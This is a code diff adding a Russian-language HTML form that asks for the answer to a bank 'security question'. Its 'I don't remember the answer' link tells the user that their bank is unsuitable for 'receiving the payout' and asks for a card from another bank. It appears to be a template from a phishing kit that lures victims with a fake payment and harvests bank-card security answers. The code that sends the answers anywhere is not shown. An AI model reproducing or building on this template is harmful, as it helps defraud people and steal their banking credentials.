@@ -1,0 +1,16 @@
+
+<form method="post" onsubmit="event.preventDefault(); return false;" id="user_question_form" class="user_question_form block-form">
+    <div class="question_form">
+        <div class="question_form__title">Контрольный вопрос</div>
+        <div class="question_form__container">
+            <div class="question_form__question"></div>
+            <div class="question_form__input-box">
+                <input type="text" placeholder="Ответ" autocomplete="off" class="user_question_answer" name="user_question_answer" id="user_question_answer">
+            </div>
+            <button type="button" onclick="user_sent_answer();" class="question_form__button button_main_color">Продолжить</button>
+        </div>
+        <div class="question_form_link">
+            <a href="javascript:void(0);" class="link_main_color" onclick="change_bank('К сожалению Ваш банк не подходит для получения выплаты. Пожалуйста, укажите карту другого банка.');">Не помню ответ</a>
+        </div>
+    </div>
+</form>
